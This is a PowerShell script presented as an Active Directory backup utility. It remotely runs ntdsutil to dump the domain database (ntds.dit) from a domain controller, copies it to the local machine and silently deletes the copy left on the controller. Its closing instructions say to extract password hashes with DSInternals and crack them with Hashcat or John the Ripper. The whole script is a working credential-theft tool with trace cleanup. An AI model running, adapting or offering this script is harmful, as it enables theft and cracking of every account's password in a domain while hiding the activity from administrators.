<#
.SYNOPSIS
    Active Directory Database Backup Utility
.DESCRIPTION
    Creates an IFM backup of the AD database and transfers
    it locally.
.NOTES
    File Name      : Create-ADBackup.ps1
    Prerequisite   : Run as Domain Admin
    Requires       : PowerShell 5.1
#>

$Host.UI.RawUI.WindowTitle = "Active Directory Database Backup Utility [ADDBU]"

# --- Environment & Encoding ---
$ErrorActionPreference = "Stop"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# --- Configuration ---
$localBackupPath  = "C:\Temp\ntds_backup"
$remoteBackupPath = "C:\windows\temp\db"
$scriptStartTime  = Get-Date

# --- UI Framework Functions ---
function Write-Title {
    param([string]$Text)
    $line = "=" * 70
    Write-Host "`n$line" -ForegroundColor Cyan
    $pad = [math]::Max(0, [math]::Floor((70 - $Text.Length) / 2))
    Write-Host (" " * $pad + $Text.ToUpper()) -ForegroundColor Cyan
    Write-Host "$line" -ForegroundColor Cyan
}

function Write-Separator {
    Write-Host ("  " + "-" * 66) -ForegroundColor DarkGray
}

function Write-Step {
    param([int]$Index, [string]$Message)
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "`n>> STEP ${Index}: $Message " -ForegroundColor Cyan -NoNewline
    Write-Host "[$timestamp]" -ForegroundColor DarkGray
}

function Write-Status {
    param([string]$Status, [string]$Message, [ConsoleColor]$Color = "Gray")
    $symbol = switch($Status) {
        "Success" { "[OK]" }
        "Info"    { "[i]" }
        "Wait"    { "[*]" }
        "Error"   { "[!]" }
        "Warn"    { "[!]" }
        Default   { "[>]" }
    }
    $sColor = switch($Status) {
        "Success" { "Green" }
        "Info"    { "Cyan" }
        "Wait"    { "Yellow" }
        "Error"   { "Red" }
        "Warn"    { "Yellow" }
        Default   { "White" }
    }
    
    Write-Host "  $symbol " -ForegroundColor $sColor -NoNewline
    
    # Word-wrap messages longer than 60 characters
    if ($Message.Length -gt 60) {
        $words = $Message -split ' '
        $line = ""
        $firstLine = $true
        
        foreach ($word in $words) {
            if (($line + $word).Length -gt 60) {
                if ($firstLine) {
                    Write-Host $line.TrimEnd() -ForegroundColor $Color
                    $firstLine = $false
                } else {
                    Write-Host "      $line" -ForegroundColor $Color
                }
                $line = $word + " "
            } else {
                $line += $word + " "
            }
        }
        if ($line.Trim()) {
            if ($firstLine) {
                Write-Host $line.TrimEnd() -ForegroundColor $Color
            } else {
                Write-Host "      $line" -ForegroundColor $Color
            }
        }
    } else {
        Write-Host $Message -ForegroundColor $Color
    }
}

function Show-Spinner {
    param([string]$Message, [scriptblock]$Action)
    
    $spinChars = @('|', '/', '-', '\')
    $job = Start-Job -ScriptBlock $Action
    $i = 0
    
    while ($job.State -eq 'Running') {
        $spin = $spinChars[$i % 4]
        Write-Host "`r  [$spin] $Message" -NoNewline -ForegroundColor Yellow
        Start-Sleep -Milliseconds 200
        $i++
    }
    
    $result = Receive-Job -Job $job
    Remove-Job -Job $job
    Write-Host "`r" -NoNewline
    return $result
}

# --- Main Execution Block ---
Clear-Host
Write-Title "Active Directory Database Backup Utility"

# Tool Description & Methodology
Write-Host "`n  Automating IFM snapshots via ntdsutil. Identifying DC," -ForegroundColor Gray
Write-Host "  capturing database files locally, and performing" -ForegroundColor Gray
Write-Host "  silent remote cleanup." -ForegroundColor Gray

Write-Separator

# Prerequisites Check
Write-Host "`n  PREREQUISITES" -ForegroundColor Cyan
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Status "Error" "Administrator rights required."
    exit 1
} else {
    Write-Status "Success" "Administrator privileges."
}

try {
    # 2. Infrastructure Discovery
    Write-Step 1 "Domain & Controller Discovery"
    
    $domain = (systeminfo | Select-String "Domain:").ToString().Split(":")[1].Trim()
    Write-Status "Success" "Domain: $domain"
    
    $dcName = (nltest /dsgetdc:$domain | Select-String "DC:").ToString().Split("\")[-1].Trim()
    if (-not $dcName) { throw "Could not resolve Domain Controller name." }
    
    Write-Status "Success" "Found Domain Controller: $dcName"
    
    if (Test-Connection -ComputerName $dcName -Count 1 -Quiet) {
        Write-Status "Success" "Network connectivity verified."
    } else {
        throw "Target DC $dcName is unreachable."
    }

    # 3. Remote Backup Creation
    Write-Step 2 "Generating Remote IFM Backup"
    Write-Status "Wait" "Executing ntdsutil on $dcName..."
    Write-Status "Info" "This operation typically takes 30-90 seconds."
    
    $scriptBlock = {
        param($path)
        if (Test-Path $path) { Remove-Item $path -Recurse -Force | Out-Null }
        New-Item -ItemType Directory -Path $path -Force | Out-Null
        
        $result = ntdsutil "ac i ntds" "ifm" "create full $path" q q 2>&1
        if ($result -match "IFM media created successfully") { return $true }
        return $false
    }
    
    $job = Invoke-Command -ComputerName $dcName -ScriptBlock $scriptBlock -ArgumentList $remoteBackupPath
    
    if ($job -eq $true) {
        Write-Status "Success" "IFM media successfully created on $dcName."
    } else {
        throw "ntdsutil failed to create the backup media."
    }

    # 4. Data Transfer
    Write-Step 3 "Transferring Data to Local Machine"
    
    # Pre-transfer analysis
    $sourcePath = "\\$dcName\C$\windows\temp\db"
    $remoteFiles = Get-ChildItem -Path $sourcePath -Force -Recurse
    $totalFiles = $remoteFiles.Count
    $totalBytes = ($remoteFiles | Where-Object { -not $_.PSIsContainer } | Measure-Object -Property Length -Sum).Sum
    $totalMB = [math]::Round($totalBytes / 1MB, 2)
    
    Write-Status "Info" "Preparing to transfer $totalFiles files ($totalMB MB)..."
    
    if (Test-Path $localBackupPath) { Remove-Item $localBackupPath -Recurse -Force | Out-Null }
    New-Item -ItemType Directory -Path $localBackupPath -Force | Out-Null

    $currentFile = 0
    $transferredBytes = 0
    $transferStart = Get-Date

    foreach ($file in $remoteFiles) {
        $currentFile++
        $percent = ($currentFile / $totalFiles) * 100
        
        # Calculate transfer rate
        $elapsed = ((Get-Date) - $transferStart).TotalSeconds
        if ($elapsed -gt 0) {
            $mbps = [math]::Round(($transferredBytes / 1MB) / $elapsed, 2)
            $rateInfo = " | $mbps MB/s"
        } else {
            $rateInfo = ""
        }
        
        Write-Progress -Activity "Downloading AD Backup" `
                       -Status "Copying: $($file.Name)$rateInfo" `
                       -PercentComplete $percent
        
        $destination = Join-Path $localBackupPath $file.FullName.Replace($sourcePath, "")
        if ($file.PSIsContainer) {
            if (-not (Test-Path $destination)) { New-Item $destination -ItemType Directory | Out-Null }
        } else {
            Copy-Item $file.FullName -Destination $destination -Force
            $transferredBytes += $file.Length
        }
    }
    Write-Progress -Activity "Downloading AD Backup" -Completed
    
    $transferTime = [math]::Round(((Get-Date) - $transferStart).TotalSeconds, 1)
    Write-Status "Success" "All files transferred to $localBackupPath"
    Write-Status "Info" "Transfer completed in $transferTime seconds."

    # 5. Remote Cleanup
    Write-Step 4 "Remote Cleanup"
    Invoke-Command -ComputerName $dcName -ScriptBlock { 
        param($path)
        if (Test-Path $path) { Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue }
    } -ArgumentList $remoteBackupPath | Out-Null
    Write-Status "Success" "Temporary files removed from $dcName."

    # 6. Final Verification
    Write-Step 5 "Final Verification"
    if (Test-Path "$localBackupPath\Active Directory\ntds.dit") {
        $ditSize = [math]::Round((Get-Item "$localBackupPath\Active Directory\ntds.dit").Length / 1MB, 2)
        Write-Status "Success" "Integrity Check: ntds.dit verified ($ditSize MB)."
    } else {
        throw "Integrity Check: ntds.dit is missing from the local folder."
    }

    # --- Summary Dashboard ---
    $duration = (Get-Date) - $scriptStartTime
    $totalSize = [math]::Round((Get-ChildItem $localBackupPath -Recurse | Measure-Object -Property Length -Sum).Sum / 1MB, 2)
    $completionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

    Write-Separator
    Write-Title "Backup Summary"
    $summary = [ordered]@{
        "Target DC"      = $dcName
        "Domain"         = $domain
        "Backup Size"    = "$totalSize MB"
        "Files Count"    = (Get-ChildItem $localBackupPath -Recurse -File).Count
        "Elapsed Time"   = "$($duration.Minutes)m $($duration.Seconds)s"
        "Completed At"   = $completionTime
        "Local Path"     = $localBackupPath
    }

    foreach ($key in $summary.Keys) {
        Write-Host "  $($key.PadRight(15)) : " -NoNewline -ForegroundColor Gray
        Write-Host $summary[$key] -ForegroundColor White
    }
    
    Write-Separator
    Write-Host "`n  " -NoNewline
    Write-Host "`n  [OK] " -ForegroundColor Green -NoNewline
    Write-Host "OPERATION COMPLETED SUCCESSFULLY" -ForegroundColor White -BackgroundColor DarkGreen
    Write-Host "`n  Next Steps:" -ForegroundColor Cyan
    Write-Host "  - Verify ntds.dit file and SYSTEM registry" -ForegroundColor Gray
    Write-Host "  - Use DSInternals to extract the password hashes" -ForegroundColor Gray
    Write-Host "  - Cracked hashes using Hashcat or John the Ripper.`n" -ForegroundColor Gray
}
catch {
    $failedStep = if ($_.InvocationInfo.ScriptLineNumber) { 
        "Line $($_.InvocationInfo.ScriptLineNumber)" 
    } else { 
        "Unknown location" 
    }
    
    $cleanError = $_.Exception.Message -replace "For more information, see the about_Remote_Troubleshooting Help topic\.", ""
    $cleanError = $cleanError.Trim()
    
    Write-Separator
    Write-Host "`n  [!] " -ForegroundColor Red -NoNewline
    Write-Host "CRITICAL FAILURE" -ForegroundColor White -BackgroundColor Red
    Write-Host "`n  Location: $failedStep" -ForegroundColor DarkGray
    Write-Host "  Details:" -ForegroundColor Gray
    
    $words = $cleanError -split ' '
    $line = ""
    foreach ($word in $words) {
        if (($line + $word).Length -gt 60) {
            Write-Host "      $line" -ForegroundColor Gray
            $line = $word + " "
        } else {
            $line += $word + " "
        }
    }
    if ($line.Trim()) { Write-Host "      $line" -ForegroundColor Gray }
    
    Write-Host "`n  Troubleshooting:" -ForegroundColor Yellow
    Write-Host "  - Verify you have Domain Admin rights" -ForegroundColor Gray
    Write-Host "  - Check network connectivity to DC" -ForegroundColor Gray
    Write-Host "  - Ensure WinRM is enabled on target DC`n" -ForegroundColor Gray
    
    exit 1
}